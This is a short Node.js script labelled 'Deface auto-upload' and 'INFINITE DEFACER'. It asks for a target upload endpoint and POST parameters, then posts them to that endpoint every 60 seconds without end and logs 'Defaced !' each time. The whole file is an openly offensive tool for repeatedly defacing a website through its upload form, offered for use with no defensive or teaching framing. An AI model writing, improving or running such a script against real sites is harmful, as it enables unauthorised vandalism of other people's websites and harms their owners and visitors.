const superagent = require('superagent');
const readline = require('readline-sync');

console.log('-- Deface auto-upload --');
console.log();
let url = readline.question('URL Endpoint upload : ');
let params = readline.question('All post params (with &, ENCODE YOUR CARACTERS) : ');
console.log();
console.log('INFINITE DEFACER LAUNCHED !');
console.log();

function deface() {
    setInterval(function(){ 
        superagent
        .post(url)
        .send(params)
        .end((err, res) => {
            console.log('<Defaced !>')
        });
     }, 60000);
  }

 deface()
